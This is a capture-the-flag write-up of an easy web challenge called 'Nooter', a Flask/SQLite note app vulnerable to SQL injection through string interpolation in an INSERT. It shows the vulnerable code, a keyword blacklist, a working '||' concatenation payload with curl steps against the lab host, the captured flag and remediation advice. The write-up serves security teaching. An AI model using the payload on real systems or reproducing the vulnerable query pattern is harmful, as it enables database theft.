# Nooter — Web (Easy)

**Author:** Obito Uchiha — Team AKATSUKI **Platform:** FlagYard — Black Hat Training Labs (by SAFCSP) **Category:** Web **Difficulty:** Easy **Target:** `http://t2jpdg8uvwnoawhh.playat.flagyard.com/login`

---

## Challenge Description

> Just another note taking app :)

A minimal Flask + SQLite note-taking application. Users register, log in, and can create personal notes. Full application source (`app.py`) was provided.

---

## Source Review

The vulnerable logic lives in the note-creation route:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if 'loggedin' in session:
        msg = ''
        if request.method == 'POST' and 'note' in request.form:
            note = request.form['note']
            if blacklist(note):
                msg = 'Forbidden word detected'
            else:
                query = db.insert("INSERT INTO notes(username, notes) VALUES(?,'%s')" % note, session['username'])
```

Two things stand out immediately:

1. The `notes` value is inserted using **Python string interpolation (`%s`)** directly into the raw SQL string, rather than a parameterized placeholder. Only `username` goes through a safe `?` binding — the `note` field is concatenated straight into the query text.
2. A `blacklist()` function is applied first, but it only blocks a fixed keyword list:

```python
def blacklist(string):
    string = string.lower()
    blocked_words = ['exec', 'load', 'blob', 'glob', 'union', 'join',
                      'like', 'match', 'regexp', 'in', 'limit', 'order',
                      'hex', 'where']
    for word in blocked_words:
        if word in string:
            return True
    return False
```

Notably absent from the blacklist: **`select`**, **`from`**, and the SQLite string-concatenation operator **`||`**. This leaves a clean path to break out of the quoted string and run a subquery without needing `UNION` or a `WHERE` clause at all.

---

## Vulnerability

**SQL Injection (CWE-89)** via unsanitized string interpolation into a raw SQL `INSERT` statement, combined with an incomplete keyword blacklist that fails to account for SQLite's `||` concatenation operator.

---

## Exploitation

### Payload

```sql
' || (select flag from flag) || '
```

None of the substrings in this payload (`select`, `flag`, `from`, `||`) appear in the blacklist, so it sails through `blacklist()` unblocked.

Once substituted into the vulnerable format string, the resulting query becomes:

```sql
INSERT INTO notes(username, notes) VALUES(?, '' || (select flag from flag) || '')
```

This is syntactically valid — still exactly two values are supplied to `VALUES(...)`. SQLite evaluates `(select flag from flag)` as a scalar subquery, concatenates it between two empty strings, and the **entire contents of the `flag` table get written directly into the attacker's own `notes` row**. From there, the app's normal note-rendering logic displays it back on the dashboard.

### Steps

**1. Register an account:**

```bash
curl -s -c cookies.txt -X POST http://t2jpdg8uvwnoawhh.playat.flagyard.com/register \
  -d "username=obito&password=pass123"
```

**2. Log in (reusing the same cookie jar):**

```bash
curl -s -c cookies.txt -b cookies.txt -X POST http://t2jpdg8uvwnoawhh.playat.flagyard.com/login \
  -d "username=obito&password=pass123"
```

**3. Submit the malicious note:**

```bash
curl -s -b cookies.txt -c cookies.txt -X POST http://t2jpdg8uvwnoawhh.playat.flagyard.com/ \
  --data-urlencode "note=' || (select flag from flag) || '"
```

**4. Reload the dashboard to view the exfiltrated flag:**

```bash
curl -s -b cookies.txt http://t2jpdg8uvwnoawhh.playat.flagyard.com/ | grep "FlagY{.*}"
```

### Result

```html
<p>FlagY{d695ef54fc9bd8ca664193eb485c4721}</p>
```

---

## Flag

```
FlagY{d695ef54fc9bd8ca664193eb485c4721}
```

---

## Root Cause

- User-controlled input (`note`) is interpolated directly into a raw SQL statement using `%` string formatting instead of being passed through a parameterized query placeholder.
- The blacklist-based input filter is a denylist of specific keywords rather than a proper allowlist/parameterization strategy, and it misses SQLite's `||` string-concatenation operator entirely — a well-known bypass vector once `UNION` and `WHERE` are blocked.

## Remediation

- **Always** use parameterized queries for every user-controlled value, with no exceptions for "just formatting a string in":
    
    ```python
    db.insert("INSERT INTO notes(username, notes) VALUES(?, ?)", session['username'], note)
    ```
    
- Do not rely on keyword blacklists to prevent SQL injection — they are inherently incomplete (as demonstrated by the missed `||` operator here). Parameterization removes the injection class entirely, regardless of what characters or keywords the input contains.
- Apply the principle of least privilege to the database user/connection so that even a successful injection cannot read unrelated tables such as `flag`.

---

_Obito Uchiha — Team AKATSUKI_